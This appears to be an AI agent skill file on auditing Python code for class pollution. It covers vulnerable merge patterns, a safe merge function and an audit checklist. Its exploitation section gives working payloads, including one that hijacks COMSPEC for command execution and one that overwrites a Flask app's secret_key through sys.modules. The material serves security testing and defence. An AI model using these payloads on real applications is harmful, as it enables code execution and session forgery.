---
name: python-class-pollution
description: Analyze Python code for class pollution vulnerabilities (Python's prototype pollution), identify vulnerable merge functions, and demonstrate exploitation techniques for authorized security testing. Use this skill whenever the user mentions Python security, prototype pollution, class pollution, merge vulnerabilities, __class__ manipulation, __globals__ access, or needs to audit Python code for object injection attacks.
---

# Python Class Pollution Analysis

A skill for identifying and analyzing class pollution vulnerabilities in Python code — the Python equivalent of JavaScript prototype pollution.

## What is Class Pollution?

Class pollution occurs when an attacker can modify class attributes, inheritance chains, or global variables through untrusted input that gets merged into objects. This is possible because Python allows dynamic modification of:

- `__class__.__qualname__` - Class names
- `__class__.__base__` - Inheritance chain
- `__class__.__init__.__globals__` - Module globals
- `__kwdefaults__` - Function keyword defaults
- `__init__.__globals__` - Class initialization globals

## Detection Patterns

### 1. Vulnerable Merge Functions

Look for recursive merge functions that use `setattr()` without validation:

```python
# VULNERABLE PATTERN
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)  # DANGEROUS: no validation
```

**Red flags:**
- `setattr()` on untrusted input
- Recursive merging without key validation
- No filtering of dunder attributes (`__class__`, `__globals__`, etc.)
- Direct attribute assignment from user-controlled dictionaries

### 2. Dangerous Attribute Access

Identify code that allows traversal through:
- `__class__` → `__base__` → `__base__` (inheritance chain)
- `__init__` → `__globals__` (module globals)
- `__kwdefaults__` (function defaults)
- `__loader__` → `__init__` → `__globals__` (sys.modules access)

## Exploitation Techniques

### Technique 1: Class Name Pollution

```python
# Pollute class names through inheritance chain
e.__class__.__qualname__ = 'Polluted_Class'
e.__class__.__base__.__qualname__ = 'Polluted_Parent'
```

**Impact:** Can confuse logging, serialization, or type-checking logic.

### Technique 2: Default Value Injection

```python
# Inject default values into parent classes
payload = {
    "__class__": {
        "__base__": {
            "__base__": {
                "custom_command": "whoami"
            }
        }
    }
}
```

**Impact:** Affects all instances of the polluted class hierarchy.

### Technique 3: Global Variable Manipulation

```python
# Access and modify module globals
payload = {
    "__class__": {
        "__init__": {
            "__globals__": {
                "sensitive_var": "polluted_value"
            }
        }
    }
}
```

**Impact:** Can modify any global variable in the module scope.

### Technique 4: Environment Variable Hijacking

```python
# Overwrite COMSPEC to redirect subprocess execution
payload = {
    "__init__": {
        "__globals__": {
            "subprocess": {
                "os": {
                    "environ": {
                        "COMSPEC": "cmd /c calc"
                    }
                }
            }
        }
    }
}
```

**Impact:** Arbitrary command execution via subprocess.

### Technique 5: Function Default Override

```python
# Modify __kwdefaults__ to change function behavior
payload = {
    "__class__": {
        "__init__": {
            "__globals__": {
                "target_function": {
                    "__kwdefaults__": {
                        "command": "malicious_command"
                    }
                }
            }
        }
    }
}
```

**Impact:** Changes default behavior of functions with keyword-only parameters.

### Technique 6: Cross-File Flask Secret Theft

```python
# Traverse to main module to access Flask app
payload = {
    "__init__": {
        "__globals__": {
            "__loader__": {
                "__init__": {
                    "__globals__": {
                        "sys": {
                            "modules": {
                                "__main__": {
                                    "app": {
                                        "secret_key": "attacker_controlled"
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```

**Impact:** Can forge Flask session cookies and escalate privileges.

## Safe Merge Implementation

```python
import re

def safe_merge(src, dst, allowed_keys=None):
    """Safe merge that prevents class pollution."""
    # Block dangerous dunder attributes
    dangerous_patterns = [
        r'^__.*__$',  # All dunder attributes
        r'^_.*$',     # Private attributes
    ]
    
    for k, v in src.items():
        # Skip dangerous keys
        if any(re.match(p, k) for p in dangerous_patterns):
            continue
        
        # Skip if key not in allowed list
        if allowed_keys and k not in allowed_keys:
            continue
        
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and isinstance(v, dict):
                safe_merge(v, dst.get(k), allowed_keys)
            else:
                dst[k] = v
        elif hasattr(dst, k) and isinstance(v, dict):
            safe_merge(v, getattr(dst, k), allowed_keys)
        else:
            setattr(dst, k, v)
```

## Audit Checklist

When reviewing Python code for class pollution:

1. [ ] Find all `merge()`, `update()`, `copy()` functions
2. [ ] Check if they use `setattr()` on untrusted input
3. [ ] Verify dunder attributes are filtered
4. [ ] Look for `__class__`, `__globals__`, `__init__` in user input
5. [ ] Check if objects are created from user-controlled dicts
6. [ ] Review serialization/deserialization code
7. [ ] Examine config loading from external sources
8. [ ] Check for `json.loads()` → object conversion patterns

## Testing (Authorized Only)

Use the `detect_class_pollution.py` script to scan codebases:

```bash
python scripts/detect_class_pollution.py --target /path/to/codebase
```

For safe experimentation, use `test_pollution_harness.py` in an isolated environment.

## References

- [Prototype Pollution in Python - abdulrah33m](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [Python inspect module documentation](https://docs.python.org/3/library/inspect.html)
- [CTF Writeup - Flask Secret Key](https://ctftime.org/writeup/36082)
